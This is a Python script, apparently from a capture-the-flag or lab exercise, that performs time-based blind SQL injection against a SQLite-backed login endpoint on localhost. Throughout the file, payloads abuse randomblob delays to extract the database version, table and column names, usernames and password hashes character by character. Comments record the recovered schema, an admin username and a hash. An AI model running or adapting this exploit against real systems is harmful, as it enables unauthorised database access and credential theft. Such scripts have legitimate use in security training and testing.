import requests
import time

def timeInjection():
    URL = "http://localhost:8080/v1/login"
    result = ""
    
    # 版本号
    payload = "0' or 1=(case when(substr(sqlite_version(),{},1)='{}') then randomblob(500000000) else 0 end) and '1"
    # 表名 user,sqlite_sequence
    payload = "0' or 1=(case when(substr((select group_concat(name) from sqlite_master),{},1)='{}') then randomblob(500000000) else 0 end) and '1"
    # 字段名 id,token,username,password,email,admin
    payload = "0' or 1=(case when(substr(substr((select sql from sqlite_master limit 1),50,100),{},1)='{}') then randomblob(500000000) else 0 end) and '1"
    # username admin
    payload = "0' or 1=(case when(substr((select group_concat(username) from user),{},1)='{}') then randomblob(500000000) else 0 end) and '1"
    # password ebfa537eede23ca1c87406388b3afc37
    payload = "0' or 1=(case when(substr((select group_concat(password) from user),{},1)='{}') then randomblob(500000000) else 0 end) and '1"


    for i in range(1,100):
        for j in range(32,128):
            tmp_payload = payload.format(i,chr(j))
            data = {
                'username':tmp_payload,
                'password':"1"
            }
            start_time = time.time()
            requests.post(url = URL, json=data, timeout=10)
            if  time.time() - start_time > 2:
                result += chr(j)
                print(result)
                print(time.time() - start_time)
                break
            else:
                pass

if __name__ == '__main__':
    timeInjection()